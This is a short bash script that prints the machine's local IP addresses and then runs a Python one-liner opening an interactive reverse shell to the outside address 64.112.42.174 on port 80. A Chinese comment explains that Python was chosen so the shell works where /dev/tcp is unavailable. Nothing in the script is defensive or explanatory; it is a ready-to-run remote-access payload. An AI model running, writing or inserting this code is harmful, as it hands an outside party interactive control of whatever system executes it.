#!/bin/bash
echo "→ Getting local network info..."
ip a | grep inet | head -2

# 改用Python实现反弹Shell，兼容性极强，不受/dev/tcp限制
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("64.112.42.174",80));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);'
